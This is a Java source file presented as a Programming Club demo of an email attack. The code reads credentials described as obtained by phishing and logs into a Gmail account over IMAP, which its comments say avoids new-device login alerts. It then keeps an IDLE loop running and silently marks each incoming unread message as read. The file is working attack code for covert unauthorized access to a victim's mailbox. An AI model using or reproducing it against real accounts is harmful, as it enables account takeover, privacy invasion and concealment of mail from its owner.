package com.secres.maildemo;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Properties;

import com.sun.mail.imap.IMAPFolder;

import jakarta.mail.Flags;
import jakarta.mail.Folder;
import jakarta.mail.MessagingException;
import jakarta.mail.Session;
import jakarta.mail.Store;
import jakarta.mail.event.ConnectionAdapter;
import jakarta.mail.event.ConnectionEvent;
import jakarta.mail.event.MessageChangedEvent;
import jakarta.mail.event.MessageChangedListener;

/**
 * A demo for Programming Club of a small-scale email attack. When having login
 * credentials, this method allows for a far more secretive approach than
 * directly logging into the account from a mail client such as mail.google.com.
 * When you login from a client, the user is notified with an email of a new
 * login on a new device. This method produces no such output. In addition, you
 * may not know the exact credentials but can pass them into the parameters. The
 * credentials can be obtained from, for example, a phishing attack by mimicking
 * Google Mail sign-in.
 * <P>
 * This technique requires
 * <a href="https://myaccount.google.com/lesssecureapps">less secure access</a>
 * to be enabled on the vulnerable account.
 * <P>
 * As said before, this is a demo. This is a very rare scenario and as such,
 * requires previous steps: less secure access for apps and stored credentials.
 * However, you do not need to know the exact login credentials for the attack.
 * 
 * @author Pranav Amarnath
 * @version April 12, 2021
 *
 */
public class MailDemo {

	private String USERNAME;
	private String PASSWORD;
	private final int IMAPS_PORT = 993;
	private final String HOST = "imap.googlemail.com";
	private final String PATH = "/credentials.txt";
	private Folder emailFolder;

	/**
	 * Constructor that uses Jakarta Mail to access emails.
	 */
	public MailDemo() {
		try {
			readMail();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * Reads the mail and sets up IMAP.
	 * 
	 * @throws MessagingException
	 */
	private void readMail() throws MessagingException {
		readFile();

		// create properties field
		Properties properties = new Properties();
		properties.setProperty("mail.imaps.partialfetch", "false");
		properties.setProperty("mail.user", USERNAME);
		properties.setProperty("mail.password", PASSWORD);

		Session emailSession = Session.getDefaultInstance(properties);

		Store store = emailSession.getStore("imaps");

		try {
			store.connect(HOST, IMAPS_PORT, USERNAME, PASSWORD);
		} catch (Exception e) {
			e.printStackTrace();
			return;
		}

		// create the folder object and open it
		emailFolder = store.getFolder("INBOX");
		emailFolder.open(Folder.READ_WRITE);

		emailFolder.addConnectionListener(new ConnectionAdapter() {
			@Override
			public void closed(ConnectionEvent e) {
				try {
					// In case the folder closes, reopen it.
					emailFolder.open(Folder.READ_WRITE);
				} catch (MessagingException e1) {
					e1.printStackTrace();
				}
			}
		});

		emailFolder.addMessageChangedListener(new MessageChangedListener() {
			@Override
			public void messageChanged(MessageChangedEvent e) {
				if(e.getMessageChangeType() == MessageChangedEvent.FLAGS_CHANGED) {
					try {
						if(!e.getMessage().isSet(Flags.Flag.SEEN)) {
							System.out.println("[LOG] Received Unread Message: " + e.getMessage().getSubject());
							// If this flag (SEEN) is not the one that has changed i.e. the read values on
							// client and server are same, return
							e.getMessage().setFlag(Flags.Flag.SEEN, true);
							System.out.println("[LOG] Changing to Read... 😈");
						}
					} catch (Exception e1) {
						e1.printStackTrace();
					}
				}
			}
		});

		startLoop(); // start loop for incoming messages
	}

	/**
	 * Creates a new {@link Thread} to enter idle mode.
	 */
	private void startLoop() {
		System.out.println("[LOG] Started IDLE loop.");
		new Thread(() -> {
			while(true) {
				// idle() corresponds to the IMAP IDLE command. The server automatically sends
				// notifications, eliminating the need for polling.
				// We put this in a loop because the idle() method will return when an IMAP
				// command is issued (for example when we mark as read).
				try {
					((IMAPFolder) emailFolder).idle();
				} catch (MessagingException e) {
					e.printStackTrace();
				}
			}
		}).start();
	}

	/**
	 * Read the file acquired from phishing.
	 */
	private void readFile() {
		try {
			BufferedReader br = new BufferedReader(new InputStreamReader(getClass().getResourceAsStream(PATH), "UTF-8"));
			try {
				String line = "";
				int i = 0;
				while((line = br.readLine()) != null) {
					if(i % 2 == 0) {
						USERNAME = line;
					}
					else {
						PASSWORD = line;
						break; // Even if there are other usernames and passwords, we only want the first pair.
					}
					i++;
				}
			} finally {
				br.close();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * Main method.
	 * 
	 * @param args  not used
	 */
	public static void main(String[] args) {
		new MailDemo();
	}

}
